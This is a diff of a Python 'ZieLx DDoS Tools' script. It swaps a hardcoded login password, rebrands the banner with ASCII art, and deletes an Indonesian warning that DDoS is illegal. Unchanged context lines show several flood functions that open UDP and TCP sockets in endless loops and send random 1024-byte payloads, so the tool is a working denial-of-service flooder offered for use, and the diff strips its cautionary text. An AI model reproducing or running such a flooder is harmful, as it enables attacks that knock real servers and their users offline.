@@ -9,10 +9,10 @@ import time
 from time import sleep
 
 os.system("clear")
-password ="zielx"
+password ="TREAX"
 
 for i in range(3):
-	pwd = input("[•] PASSWORD: ")
+	pwd = input("[•] ENTER PASSWORD : ")
 	j=3
 	if(pwd==password):
 		time.sleep(5)
@@ -23,33 +23,21 @@ for i in range(3):
 		print("[×] WRONG PASSWORD!!! ")
 		continue
 time.sleep(5)
-print("{} Your Account Has Been Accepted! \033[92mZieLx\033[0m ")
+print("{} Your Account Has Been Accepted! \033[92m[√]\033[0m ")
 time.sleep(5)
 os.system("clear")
-print("\u001b[31m{} Baca Dulu Goblog!")
-print("""\u001b[31m
-|              WARNING!!!!               |
-|                                        |
-|DDoS merupakan hal ilegal,perlu di ingat|
-|DDoS hanya dilakukan jika pemilik server|
-|Melakukan kesalahan terhadap kalian     |
-|Jadi jangan kalian DDoS server server   |
-|Kecil, jadi Don't abuse                 |
-time.sleep(5)
 
-os.system("clear")
-print(""
-    TOOLS BY ZIELX |+| PLEASE DON'T ABUSE !!!
-
-
-\033[0m 
-                
-                
-                
-                
-               
-
-\033[92m========= ZieLx DDoS Tools =========
+print("""\033[92
+▄▄▄█████▓ ██▀███  ▒██   ██▒
+▓  ██▒ ▓▒▓██ ▒ ██▒▒▒ █ █ ▒░
+▒ ▓██░ ▒░▓██ ░▄█ ▒░░  █   ░
+░ ▓██▓ ░ ▒██▀▀█▄   ░ █ █ ▒ 
+  ▒██▒ ░ ░██▓ ▒██▒▒██▒ ▒██▒
+  ▒ ░░   ░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░
+    ░      ░▒ ░ ▒░░░   ░▒ ░
+  ░        ░░   ░  ░    ░  
+            ░      ░    ░  """) 
+print("\033[92m========= ZieLx DDoS Tools =========") 
 >> Author : ZieLx
 >>> Coded : ZieLx
 >>>> Discord Comunity : https://discord.gg/treax""")
@@ -61,7 +49,7 @@ threads = int(input("[+] Threads : "))
 os.system("clear")
 def ddos():
 	data = random._urandom(1024)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -74,7 +62,7 @@ def ddos():
 
 def ddos2():
 	data = random._urandom(1025)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -89,7 +77,7 @@ def ddos2():
 
 def ddos3():
 	data = random._urandom(1025)
-	i = random.choice(("[•]","[•]","[•]"))
+	i = random.choice(("[-]","[•]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
